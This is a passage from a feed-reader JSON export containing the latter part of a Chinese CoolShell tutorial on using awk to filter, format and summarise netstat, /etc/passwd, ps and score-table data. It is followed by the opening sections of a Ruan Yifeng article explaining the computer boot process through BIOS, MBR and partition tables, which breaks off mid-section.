coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2\ntcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED\ntcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED\ntcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2\ntcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED\ntcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT\ntcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED\ntcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1\ntcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED\ntcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT\ntcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK\ntcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED\ntcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2\ntcp        0      0 :::22                  :::*                        LISTEN\n</pre>\n<p>下面是最简单最常用的awk示例，其输出第1列和第4例，</p>\n<ul>\n<li>其中单引号中的被大括号括着的就是awk的语句，注意，其只能被单引号包含。</li>\n<li>其中的$1..$n表示第几例。注：$0表示整个行。</li>\n</ul>\n<pre>$ awk '{print $1, $4}' netstat.txt\nProto Local-Address\ntcp 0.0.0.0:3306\ntcp 0.0.0.0:80\ntcp 127.0.0.1:9000\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp coolshell.cn:80\ntcp :::22</pre>\n<p>我们再来看看awk的格式化输出，和C语言的printf没什么两样：</p>\n<pre>$ awk &#39;{printf &quot;%-8s %-8s %-8s %-18s %-22s %-15s\\n&quot;,$1,$2,$3,$4,$5,$6}&#39; netstat.txt\nProto    Recv-Q   Send-Q   Local-Address      Foreign-Address        State\ntcp      0        0        0.0.0.0:3306       0.0.0.0:*              LISTEN\ntcp      0        0        0.0.0.0:80         0.0.0.0:*              LISTEN\ntcp      0        0        127.0.0.1:9000     0.0.0.0:*              LISTEN\ntcp      0        0        coolshell.cn:80    124.205.5.146:18245    TIME_WAIT\ntcp      0        0        coolshell.cn:80    61.140.101.185:37538   FIN_WAIT2\ntcp      0        0        coolshell.cn:80    110.194.134.189:1032   ESTABLISHED\ntcp      0        0        coolshell.cn:80    123.169.124.111:49809  ESTABLISHED\ntcp      0        0        coolshell.cn:80    116.234.127.77:11502   FIN_WAIT2\ntcp      0        0        coolshell.cn:80    123.169.124.111:49829  ESTABLISHED\ntcp      0        0        coolshell.cn:80    183.60.215.36:36970    TIME_WAIT\ntcp      0        4166     coolshell.cn:80    61.148.242.38:30901    ESTABLISHED\ntcp      0        1        coolshell.cn:80    124.152.181.209:26825  FIN_WAIT1\ntcp      0        0        coolshell.cn:80    110.194.134.189:4796   ESTABLISHED\ntcp      0        0        coolshell.cn:80    183.60.212.163:51082   TIME_WAIT\ntcp      0        1        coolshell.cn:80    208.115.113.92:50601   LAST_ACK\ntcp      0        0        coolshell.cn:80    123.169.124.111:49840  ESTABLISHED\ntcp      0        0        coolshell.cn:80    117.136.20.85:50025    FIN_WAIT2\ntcp      0        0        :::22              :::*                   LISTEN</pre>\n<h4>脱掉外套</h4>\n<h5>过滤记录</h5>\n<p>我们再来看看如何过滤记录（下面过滤条件为：第三列的值为0 &amp;&amp; 第6列的值为LISTEN）</p>\n<pre>$ awk &#39;$3==0 &amp;&amp; $6==&quot;LISTEN&quot; &#39; netstat.txt\ntcp        0      0 0.0.0.0:3306               0.0.0.0:*              LISTEN\ntcp        0      0 0.0.0.0:80                 0.0.0.0:*              LISTEN\ntcp        0      0 127.0.0.1:9000             0.0.0.0:*              LISTEN\ntcp        0      0 :::22                      :::*                   LISTEN</pre>\n<p>其中的“==”为比较运算符。其他比较运算符：!=, &gt;, &lt;, &gt;=, &lt;=</p>\n<p>我们来看看各种过滤记录的方式：</p>\n<pre>$ awk &#39; $3&gt;0 {print $0}&#39; netstat.txt\nProto Recv-Q Send-Q Local-Address          Foreign-Address             State\ntcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED\ntcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1\ntcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK</pre>\n<p>如果我们需要表头的话，我们可以引入内建变量NR：</p>\n<pre>$ awk &#39;$3==0 &amp;&amp; $6==&quot;LISTEN&quot; || NR==1 &#39; netstat.txt\nProto Recv-Q Send-Q Local-Address          Foreign-Address             State\ntcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN\ntcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN\ntcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN\ntcp        0      0 :::22                  :::*                        LISTEN</pre>\n<p>再加上格式化输出：</p>\n<pre>$ awk &#39;$3==0 &amp;&amp; $6==&quot;LISTEN&quot; || NR==1 {printf &quot;%-20s %-20s %s\\n&quot;,$4,$5,$6}&#39; netstat.txt\nLocal-Address        Foreign-Address      State\n0.0.0.0:3306         0.0.0.0:*            LISTEN\n0.0.0.0:80           0.0.0.0:*            LISTEN\n127.0.0.1:9000       0.0.0.0:*            LISTEN\n:::22                :::*                 LISTEN</pre>\n<h5><strong>内建变量</strong></h5>\n<p>说到了内建变量，我们可以来看看awk的一些内建变量：</p>\n<table border=\"0\" cellspacing=\"1\" cellpadding=\"4\">\n<tbody>\n<tr>\n<td bgcolor=\"#ffffff\">$0</td>\n<td bgcolor=\"#ffffff\">当前记录（这个变量中存放着整个行的内容）</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">$1~$n</td>\n<td bgcolor=\"#ffffff\">当前记录的第n个字段，字段间由FS分隔</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">FS</td>\n<td bgcolor=\"#ffffff\">输入字段分隔符 默认是空格或Tab</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">NF</td>\n<td bgcolor=\"#ffffff\">当前记录中的字段个数，就是有多少列</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">NR</td>\n<td bgcolor=\"#ffffff\">已经读出的记录数，就是行号，从1开始，如果有多个文件话，这个值也是不断累加中。</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">FNR</td>\n<td bgcolor=\"#ffffff\">当前记录数，与NR不同的是，这个值会是各个文件自己的行号</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">RS</td>\n<td bgcolor=\"#ffffff\">输入的记录分隔符， 默认为换行符</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">OFS</td>\n<td bgcolor=\"#ffffff\">输出字段分隔符， 默认也是空格</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">ORS</td>\n<td bgcolor=\"#ffffff\">输出的记录分隔符，默认为换行符</td>\n</tr>\n<tr>\n<td bgcolor=\"#ffffff\">FILENAME</td>\n<td bgcolor=\"#ffffff\">当前输入文件的名字</td>\n</tr>\n</tbody>\n</table>\n<p>怎么使用呢，比如：我们如果要输出行号：</p>\n<pre>$ awk &#39;$3==0 &amp;&amp; $6==&quot;ESTABLISHED&quot; || NR==1 {printf &quot;%02s %s %-20s %-20s %s\\n&quot;,NR, FNR, $4,$5,$6}&#39; netstat.txt\n01 1 Local-Address        Foreign-Address      State\n07 7 coolshell.cn:80      110.194.134.189:1032 ESTABLISHED\n08 8 coolshell.cn:80      123.169.124.111:49809 ESTABLISHED\n10 10 coolshell.cn:80      123.169.124.111:49829 ESTABLISHED\n14 14 coolshell.cn:80      110.194.134.189:4796 ESTABLISHED\n17 17 coolshell.cn:80      123.169.124.111:49840 ESTABLISHED</pre>\n<h5><strong>指定分隔符</strong></h5>\n<pre>$  awk  &#39;BEGIN{FS=&quot;:&quot;} {print $1,$3,$6}&#39; /etc/passwd\nroot 0 /root\nbin 1 /bin\ndaemon 2 /sbin\nadm 3 /var/adm\nlp 4 /var/spool/lpd\nsync 5 /sbin\nshutdown 6 /sbin\nhalt 7 /sbin</pre>\n<p>上面的命令也等价于：（-F的意思就是指定分隔符）</p>\n<pre>$ awk  -F: '{print $1,$3,$6}' /etc/passwd</pre>\n<p>注：如果你要指定多个分隔符，你可以这样来：</p>\n<pre>awk -F '[;:]'</pre>\n<p>再来看一个以\\t作为分隔符输出的例子（下面使用了/etc/passwd文件，这个文件是以:分隔的）：</p>\n<pre>$ awk  -F: &#39;{print $1,$3,$6}&#39; OFS=&quot;\\t&quot; /etc/passwd\nroot    0       /root\nbin     1       /bin\ndaemon  2       /sbin\nadm     3       /var/adm\nlp      4       /var/spool/lpd\nsync    5       /sbin</pre>\n<h4>脱掉衬衫</h4>\n<h5>字符串匹配</h5>\n<p>我们再来看几个字符串匹配的示例：</p>\n<pre>$ awk &#39;$6 ~ /FIN/ || NR==1 {print NR,$4,$5,$6}&#39; OFS=&quot;\\t&quot; netstat.txt\n1       Local-Address   Foreign-Address State\n6       coolshell.cn:80 61.140.101.185:37538    FIN_WAIT2\n9       coolshell.cn:80 116.234.127.77:11502    FIN_WAIT2\n13      coolshell.cn:80 124.152.181.209:26825   FIN_WAIT1\n18      coolshell.cn:80 117.136.20.85:50025     FIN_WAIT2\n\n$ $ awk &#39;$6 ~ /WAIT/ || NR==1 {print NR,$4,$5,$6}&#39; OFS=&quot;\\t&quot; netstat.txt\n1       Local-Address   Foreign-Address State\n5       coolshell.cn:80 124.205.5.146:18245     TIME_WAIT\n6       coolshell.cn:80 61.140.101.185:37538    FIN_WAIT2\n9       coolshell.cn:80 116.234.127.77:11502    FIN_WAIT2\n11      coolshell.cn:80 183.60.215.36:36970     TIME_WAIT\n13      coolshell.cn:80 124.152.181.209:26825   FIN_WAIT1\n15      coolshell.cn:80 183.60.212.163:51082    TIME_WAIT\n18      coolshell.cn:80 117.136.20.85:50025     FIN_WAIT2</pre>\n<p>上面的第一个示例匹配FIN状态， 第二个示例匹配WAIT字样的状态。其实 ~ 表示模式开始。/ /中是模式。这就是一个正则表达式的匹配。</p>\n<p>其实awk可以像grep一样的去匹配第一行，就像这样：</p>\n<pre>$ awk '/LISTEN/' netstat.txt\ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\ntcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN\ntcp        0      0 :::22                   :::*                    LISTEN</pre>\n<p>我们可以使用 “/FIN|TIME/” 来匹配 FIN 或者 TIME :</p>\n<pre>$ awk &#39;$6 ~ /FIN|TIME/ || NR==1 {print NR,$4,$5,$6}&#39; OFS=&quot;\\t&quot; netstat.txt\n1       Local-Address   Foreign-Address State\n5       coolshell.cn:80 124.205.5.146:18245     TIME_WAIT\n6       coolshell.cn:80 61.140.101.185:37538    FIN_WAIT2\n9       coolshell.cn:80 116.234.127.77:11502    FIN_WAIT2\n11      coolshell.cn:80 183.60.215.36:36970     TIME_WAIT\n13      coolshell.cn:80 124.152.181.209:26825   FIN_WAIT1\n15      coolshell.cn:80 183.60.212.163:51082    TIME_WAIT\n18      coolshell.cn:80 117.136.20.85:50025     FIN_WAIT2</pre>\n<p>再来看看模式取反的例子：</p>\n<pre>$ awk &#39;$6 !~ /WAIT/ || NR==1 {print NR,$4,$5,$6}&#39; OFS=&quot;\\t&quot; netstat.txt\n1       Local-Address   Foreign-Address State\n2       0.0.0.0:3306    0.0.0.0:*       LISTEN\n3       0.0.0.0:80      0.0.0.0:*       LISTEN\n4       127.0.0.1:9000  0.0.0.0:*       LISTEN\n7       coolshell.cn:80 110.194.134.189:1032    ESTABLISHED\n8       coolshell.cn:80 123.169.124.111:49809   ESTABLISHED\n10      coolshell.cn:80 123.169.124.111:49829   ESTABLISHED\n12      coolshell.cn:80 61.148.242.38:30901     ESTABLISHED\n14      coolshell.cn:80 110.194.134.189:4796    ESTABLISHED\n16      coolshell.cn:80 208.115.113.92:50601    LAST_ACK\n17      coolshell.cn:80 123.169.124.111:49840   ESTABLISHED\n19      :::22   :::*    LISTEN</pre>\n<p>或是：</p>\n<pre>awk '!/WAIT/' netstat.txt</pre>\n<p><strong>折分文件</strong></p>\n<p>awk拆分文件很简单，使用重定向就好了。下面这个例子，是按第6例分隔文件，相当的简单（其中的NR!=1表示不处理表头）。</p>\n<pre>$ awk &#39;NR!=1{print &gt; $6}&#39; netstat.txt\n\n$ ls\nESTABLISHED  FIN_WAIT1  FIN_WAIT2  LAST_ACK  LISTEN  netstat.txt  TIME_WAIT\n\n$ cat ESTABLISHED\ntcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED\ntcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED\ntcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED\ntcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED\ntcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED\ntcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED\n\n$ cat FIN_WAIT1\ntcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1\n\n$ cat FIN_WAIT2\ntcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2\ntcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2\ntcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2\n\n$ cat LAST_ACK\ntcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK\n\n$ cat LISTEN\ntcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN\ntcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN\ntcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN\ntcp        0      0 :::22                  :::*                        LISTEN\n\n$ cat TIME_WAIT\ntcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT\ntcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT\ntcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT</pre>\n<p>你也可以把指定的列输出到文件：</p>\n<pre>awk &#39;NR!=1{print $4,$5 &gt; $6}&#39; netstat.txt</pre>\n<p>再复杂一点：（注意其中的if-else-if语句，可见awk其实是个脚本解释器）</p>\n<pre>$ awk &#39;NR!=1{if($6 ~ /TIME|ESTABLISHED/) print &gt; &quot;1.txt&quot;;\nelse if($6 ~ /LISTEN/) print &gt; &quot;2.txt&quot;;\nelse print &gt; &quot;3.txt&quot; }&#39; netstat.txt\n\n$ ls ?.txt\n1.txt  2.txt  3.txt\n\n$ cat 1.txt\ntcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT\ntcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED\ntcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED\ntcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED\ntcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT\ntcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED\ntcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED\ntcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT\ntcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED\n\n$ cat 2.txt\ntcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN\ntcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN\ntcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN\ntcp        0      0 :::22                  :::*                        LISTEN\n\n$ cat 3.txt\ntcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2\ntcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2\ntcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1\ntcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK\ntcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2</pre>\n<h5>统计</h5>\n<p>下面的命令计算所有的C文件，CPP文件和H文件的文件大小总和。</p>\n<pre>$ ls -l  *.cpp *.c *.h | awk '{sum+=$5} END {print sum}'\n2511401</pre>\n<p>我们再来看一个统计各个connection状态的用法：（我们可以看到一些编程的影子了，大家都是程序员我就不解释了。注意其中的数组的用法）</p>\n<pre>$ awk &#39;NR!=1{a[$6]++;} END {for (i in a) print i &quot;, &quot; a[i];}&#39; netstat.txt\nTIME_WAIT, 3\nFIN_WAIT1, 1\nESTABLISHED, 6\nFIN_WAIT2, 3\nLAST_ACK, 1\nLISTEN, 4</pre>\n<p>再来看看统计每个用户的进程的占了多少内存（注：sum的RSS那一列）</p>\n<pre>$ ps aux | awk &#39;NR!=1{a[$1]+=$6;} END { for(i in a) print i &quot;, &quot; a[i]&quot;KB&quot;;}&#39;\ndbus, 540KB\nmysql, 99928KB\nwww, 3264924KB\nroot, 63644KB\nhchen, 6020KB</pre>\n<h4>脱掉内衣</h4>\n<h5>awk脚本</h5>\n<p>在上面我们可以看到一个END关键字。END的意思是“处理完所有的行的标识”，即然说到了END就有必要介绍一下BEGIN，这两个关键字意味着执行前和执行后的意思，语法如下：</p>\n<ul>\n<li>BEGIN{ 这里面放的是执行前的语句 }</li>\n<li>END {这里面放的是处理完所有的行后要执行的语句 }</li>\n<li>{这里面放的是处理每一行时要执行的语句}</li>\n</ul>\n<p>为了说清楚这个事，我们来看看下面的示例：</p>\n<p>假设有这么一个文件（学生成绩表）：</p>\n<pre>$ cat score.txt\nMarry   2143 78 84 77\nJack    2321 66 78 45\nTom     2122 48 77 71\nMike    2537 87 97 95\nBob     2415 40 57 62</pre>\n<p>我们的awk脚本如下（我没有写有命令行上是因为命令行上不易读，另外也在介绍另一种用法）：</p>\n<pre>$ cat cal.awk\n#!/bin/awk -f\n#运行前\nBEGIN {\n    math = 0\n    english = 0\n    computer = 0\n\n    printf &quot;NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\\n&quot;\n    printf &quot;---------------------------------------------\\n&quot;\n}\n#运行中\n{\n    math+=$3\n    english+=$4\n    computer+=$5\n    printf &quot;%-6s %-6s %4d %8d %8d %8d\\n&quot;, $1, $2, $3,$4,$5, $3+$4+$5\n}\n#运行后\nEND {\n    printf &quot;---------------------------------------------\\n&quot;\n    printf &quot;  TOTAL:%10d %8d %8d \\n&quot;, math, english, computer\n    printf &quot;AVERAGE:%10.2f %8.2f %8.2f\\n&quot;, math/NR, english/NR, computer/NR\n}</pre>\n<p>我们来看一下执行结果：（也可以这样运行 ./cal.awk score.txt）</p>\n<pre>$ awk -f cal.awk score.txt\nNAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n---------------------------------------------\nMarry  2143     78       84       77      239\nJack   2321     66       78       45      189\nTom    2122     48       77       71      196\nMike   2537     87       97       95      279\nBob    2415     40       57       62      159\n---------------------------------------------\n  TOTAL:       319      393      350\nAVERAGE:     63.80    78.60    70.00</pre>\n<h5>环境变量</h5>\n<p>即然说到了脚本，我们来看看怎么和环境变量交互：（使用-v参数和ENVIRON，使用ENVIRON的环境变量需要export）</p>\n<pre>$ x=5\n\n$ y=10\n$ export y\n\n$ echo $x $y\n5 10\n\n$ awk -v val=$x &#39;{print $1, $2, $3, $4+val, $5+ENVIRON[&quot;y&quot;]}&#39; OFS=&quot;\\t&quot; score.txt\nMarry   2143    78      89      87\nJack    2321    66      83      55\nTom     2122    48      82      81\nMike    2537    87      102     105\nBob     2415    40      62      72\n</pre>\n<h4>几个花活</h4>\n<p>最后，我们再来看几个小例子：</p>\n<pre>#从file文件中找出长度大于80的行\nawk &#39;length&gt;80&#39; file\n\n#按连接数查看客户端IP\nnetstat -ntu | awk &#39;{print $5}&#39; | cut -d: -f1 | sort | uniq -c | sort -nr\n\n#打印99乘法表\nseq 9 | sed &#39;H;g&#39; | awk -v RS=&#39;&#39; &#39;{for(i=1;i&lt;=NF;i++)printf(&quot;%dx%d=%d%s&quot;, i, NR, i*NR, i==NR?&quot;\\n&quot;:&quot;\\t&quot;)}&#39; </pre>\n<h4>自己撸吧</h4>\n<p>关于其中的一些知识点可以参看<a href=\"http://www.gnu.org/software/gawk/manual/gawk.html\">gawk的手册</a>：</p>\n<ul>\n<li>内建变量，参看：<a href=\"http://www.gnu.org/software/gawk/manual/gawk.html#Built_002din-Variables\">http://www.gnu.org/software/gawk/manual/gawk.html#Built_002din-Variables</a></li>\n<li>流控方面，参看：<a href=\"http://www.gnu.org/software/gawk/manual/gawk.html#Statements\">http://www.gnu.org/software/gawk/manual/gawk.html#Statements</a></li>\n<li>内建函数，参看：<a href=\"http://www.gnu.org/software/gawk/manual/gawk.html#Built_002din\">http://www.gnu.org/software/gawk/manual/gawk.html#Built_002din</a></li>\n<li>正则表达式，参看：<a href=\"http://www.gnu.org/software/gawk/manual/gawk.html#Regexp\">http://www.gnu.org/software/gawk/manual/gawk.html#Regexp</a></li>\n</ul>\n<p>（全文完）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2012年11月23日 -- <a href=\"http://coolshell.cn/articles/8619.html\">你可能不知道的Shell</a></li><li>2013年01月09日 -- <a href=\"http://coolshell.cn/articles/8883.html\">应该知道的Linux技巧</a></li><li>2012年07月11日 -- <a href=\"http://coolshell.cn/articles/7829.html\">28个Unix/Linux的命令行神器</a></li><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li><li>2013年04月26日 -- <a href=\"http://coolshell.cn/articles/9410.html\">Unix考古记：一个“遗失”的shell</a></li><li>2012年05月03日 -- <a href=\"http://coolshell.cn/articles/7236.html\">用Unix的设计思想来应对多变的需求</a></li><li>2012年08月01日 -- <a href=\"http://coolshell.cn/articles/7965.html\">一个fork的面试题</a></li><li>2012年06月20日 -- <a href=\"http://coolshell.cn/articles/7490.html\">性能调优攻略</a></li></ul><div><a href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1360991808633",
    "timestampUsec" : "1360991808633662",
    "id" : "tag:google.com,2005:reader/item/25f779a2b9d88cd9",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "计算机是如何启动的？",
    "published" : 1360991018,
    "updated" : 1360991018,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2013/02/booting.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>从打开电源到开始操作，计算机的启动是一个非常复杂的过程。</p><p><img src=\"http://image.beekka.com/blog/201302/bg2013021501.jpg\"></p>\n\n<p>我一直搞不清楚，这个过程到底是怎么回事，只看见屏幕快速滚动各种提示...... 这几天，我查了一些资料，试图搞懂它。下面就是我整理的笔记。</p>\n\n<p><strong>零、boot的含义</strong></p>\n\n<p>先问一个问题，\"启动\"用英语怎么说？</p>\n\n<p>回答是boot。可是，boot原来的意思是靴子，\"启动\"与靴子有什么关系呢？ 原来，这里的boot是bootstrap（鞋带）的缩写，它来自一句谚语：</p>\n\n<blockquote>\n\n<p>　　\"pull oneself up by one's bootstraps\"</p>\n\n</blockquote>\n\n<p>字面意思是\"拽着鞋带把自己拉起来\"，这当然是不可能的事情。最早的时候，工程师们用它来比喻，计算机启动是一个很矛盾的过程：必须先运行程序，然后计算机才能启动，但是计算机不启动就无法运行程序！</p>\n\n<p>早期真的是这样，必须想尽各种办法，把一小段程序装进内存，然后计算机才能正常运行。所以，工程师们把这个过程叫做\"拉鞋带\"，久而久之就简称为boot了。</p>\n\n<p>计算机的整个启动过程分成四个阶段。</p>\n\n<p><strong>一、第一阶段：BIOS</strong></p>\n\n<p>上个世纪70年代初，\"只读内存\"（read-only memory，缩写为ROM）发明，开机程序被刷入ROM芯片，计算机通电后，第一件事就是读取它。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201302/bg2013021502.jpg\"></p>\n\n<p>这块芯片里的程序叫做\"基本輸出輸入系統\"（Basic Input/Output System），简称为<a href=\"http://en.wikipedia.org/wiki/BIOS\">BIOS</a>。</p>\n\n<p><strong>1.1 硬件自检</strong></p>\n\n<p>BIOS程序首先检查，计算机硬件能否满足运行的基本条件，这叫做\"硬件自检\"（Power-On Self-Test），缩写为<a href=\"http://en.wikipedia.org/wiki/Power-on_self-test\">POST</a>。</p>\n\n<p>如果硬件出现问题，主板会发出不同含义的<a href=\"http://en.wikipedia.org/wiki/Power-on_self-test#Original_IBM_POST_beep_codes\">蜂鸣</a>，启动中止。如果没有问题，屏幕就会显示出CPU、内存、硬盘等信息。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201302/bg2013021503.png\"></p>\n\n<p><strong>1.2 启动顺序</strong></p>\n\n<p>硬件自检完成后，BIOS把控制权转交给下一阶段的启动程序。</p>\n\n<p>这时，BIOS需要知道，\"下一阶段的启动程序\"具体存放在哪一个设备。也就是说，BIOS需要有一个外部储存设备的排序，排在前面的设备就是优先转交控制权的设备。这种排序叫做\"启动顺序\"（Boot Sequence）。</p>\n\n<p>打开BIOS的操作界面，里面有一项就是\"设定启动顺序\"。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201302/bg2013021504.jpg\"></p>\n\n<p><strong>二、第二阶段：主引导记录</strong></p>\n\n<p>BIOS按照\"启动顺序\"，把控制权转交给排在第一位的储存设备。</p>\n\n<p>这时，计算机读取该设备的第一个扇区，也就是读取最前面的512个字节。如果这512个字节的最后两个字节是0x55和0xAA，表明这个设备可以用于启动；如果不是，表明设备不能用于启动，控制权于是被转交给\"启动顺序\"中的下一个设备。</p>\n\n<p>这最前面的512个字节，就叫做<a href=\"http://en.wikipedia.org/wiki/Master_boot_record\">\"主引导记录\"</a>（Master boot record，缩写为MBR）。</p>\n\n<p><strong>2.1 主引导记录的结构</strong></p>\n\n<p>\"主引导记录\"只有512个字节，放不了太多东西。它的主要作用是，告诉计算机到硬盘的哪一个位置去找操作系统。</p>\n\n<p>主引导记录由三个部分组成：</p>\n\n<blockquote>\n\n<p>　　（1） 第1-446字节：调用操作系统的机器码。</p>\n\n<p>　　（2） 第447-510字节：分区表（Partition table）。</p>\n\n<p>　　（3） 第511-512字节：主引导记录签名（0x55和0xAA）。</p>\n\n</blockquote>\n\n<p>其中，第二部分\"分区表\"的作用，是将硬盘分成若干个区。</p>\n\n<p><strong>2.2 分区表</strong></p>\n\n<p>硬盘分区有很多<a href=\"http://en.wikipedia.org/wiki/Disk_partitioning#Benefits_of_multiple_partitions\">好处</a>。考虑到每个区可以安装不同的操作系统，\"主引导记录\"因此必须知道将控制权转交给哪个区。</p>\n\n<p>分区表的长度只有64个字节，里面又分成四项，每项16个字节。所以，一个硬盘最多只能分四个一级分区，又叫做\"主分区\"。</p>\n\n<p>每个主分区的16个字节，由6个部分组成：</p>\n\n<blockquote>\n\n<p>　　（1） 第1个字节：如果为0x80，就表示该主分区是激活分区，控制权要转交给这个分区。四个主分区里面只能有一个是激活的。</p>\n\n<p>　　（2） 第2-4个字节：主分区第一个扇区的物理位置（柱面、磁头、扇区号等等）。</p>\n\n<p>　　（3） 第5个字节：<a href=\"http://en.wikipedia.org/wiki/Partition_type\">主分区类型</a>。</p>\n\n<p>　　（4） 第6-8个字节：主分区最后一个扇区的物理位置。</p>\n\n<p>　　（5） 第9-12字节：该主分区第一个扇区的逻辑地址。</p>\n\n<p>　　（6） 第13-16字节：主分区的扇区总数。</p>\n\n</blockquote>\n\n<p>最后的四个字节（\"主分区的扇区总数\"），决定了这个主分区的长度。也就是说，一个主分区的扇区总数最多不超过2的32次方。</p>\n\n<p>如果每个扇区为512个字节，就意味着单个分区最大不超过2TB。再考虑到扇区的逻辑地址也是32位，所以单个硬盘可利用的空间最大也不超过2TB。如果想使用更大的硬盘，只有2个方法：一是提高每个扇区的字节数，二是<a href=\"http://en.wikipedia.org/wiki/GUID_Partition_Table\">增加扇区总数</a>。</p>\n\n<p><strong>三、第三阶段：硬盘启动</strong></p>\n\n<p>这时，计算机的控制权就要转交给硬盘的某个分区了，这里又分成三种情况。</p>\n\n<p><strong>3.1 情况A：卷引导记录</strong></p>\n\n<p>上一节提到，四个主分区里面，只有一个是激活的。计算机会读取激活分区的第一个扇区，叫做<a href=\"http://en.wikipedia.org/wiki/Volume_Boot_Record\">\"卷引导记录</a>\"（Volume boot record，缩写为VBR）。</p>\n\n<p>\"卷引导记录\"的主要作用是，告诉计算机，操作系统在这个分区里的位置。然后，计算机就会加载操作系统了。</p>\n\n<p><strong>3.2 